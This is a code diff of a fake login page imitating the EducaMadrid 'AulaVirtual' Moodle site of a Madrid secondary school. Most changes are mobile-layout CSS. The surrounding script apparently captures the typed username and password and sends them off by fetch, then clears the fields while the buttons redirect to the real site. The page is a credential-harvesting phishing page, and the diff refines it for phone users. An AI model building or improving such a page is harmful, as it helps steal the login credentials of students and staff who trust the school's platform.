@@ -3,6 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <title>Entrar al sitio | AulaVirtual</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- Esto es clave para móviles -->
   <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/styles.php/educamadrid/1743813109_1741762448/all">
   <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?3.18.1/cssreset/cssreset-min.css&amp;3.18.1/cssfonts/cssfonts-min.css&amp;3.18.1/cssgrids/cssgrids-min.css&amp;3.18.1/cssbase/cssbase-min.css">
   <link rel="stylesheet" type="text/css" href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/theme/yui_combo.php?rollup/3.18.1/yui-moodlesimple-min.css">
@@ -16,6 +17,7 @@
       align-items: center;
       height: 100vh;
       margin: 0;
+      padding: 20px;
     }
     .login-container {
       background-color: white;
@@ -23,6 +25,9 @@
       border-radius: 10px;
       box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
       text-align: center;
+      max-width: 400px;
+      width: 100%;
+      box-sizing: border-box;
     }
     .logo {
       display: flex;
@@ -33,6 +38,7 @@
     }
     .logo img {
       height: 40px;
+      max-width: 100%;
     }
     .login-container input {
       width: 100%;
@@ -41,6 +47,7 @@
       border-radius: 6px;
       border: 1px solid #ccc;
       font-size: 16px;
+      box-sizing: border-box;
     }
     .password-container {
       position: relative;
@@ -76,6 +83,27 @@
       margin-top: 15px;
       cursor: pointer;
     }
+
+    @media (max-height: 600px) {
+      body {
+        align-items: flex-start;
+        height: auto;
+        padding-top: 40px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 20px;
+      }
+      .login-button, .guest-button {
+        font-size: 16px;
+        padding: 10px;
+      }
+      .login-container input {
+        font-size: 15px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -88,12 +116,13 @@
     <div class="password-container">
       <input type="password" id="mensajeInput" placeholder="Contraseña">
       <button class="toggle-password">
-        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.vecteezy.com%2Fsystem%2Fresources%2Fpreviews%2F048%2F839%2F086%2Foriginal%2Feye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg&f=1&nofb=1&ipt=37e81ac21f5fb1750652ca2d3de8c0e3780a6dd40ccc9add8342107ffa608fd1" alt="Ver contraseña" height="20" style="right: 0px; position: absolute; top: -10px;">
+        <img src="https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fstatic.vecteezy.com%2Fsystem%2Fresources%2Fpreviews%2F048%2F839%2F086%2Foriginal%2Feye-silhouette-icon-icons-used-for-password-and-ophthalmology-vector.jpg&f=1&nofb=1&ipt=37e81ac21f5fb1750652ca2d3de8c0e3780a6dd40ccc9add8342107ffa608fd1" alt="Ver contraseña" height="20">
       </button>
     </div>
     <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php"><button id="btnEnviar" class="login-button">Acceder</button></a>
     <a href="https://aulavirtual33.educa.madrid.org/ies.mirasierra.madrid/login/index.php?loginredirect=1"><button class="guest-button">Entrar como persona invitada</button></a>
   </div>
+
   <script>
     const nombreInput = document.getElementById('nombreInput');
     const mensajeInput = document.getElementById('mensajeInput');
@@ -122,7 +151,6 @@
       })
       .then(res => {
         console.log("Petición enviada. Status:", res.status);
-    
         nombreInput.value = '';
         mensajeInput.value = '';
       })
@@ -133,3 +161,4 @@
   </script>
 </body>
 </html>
+
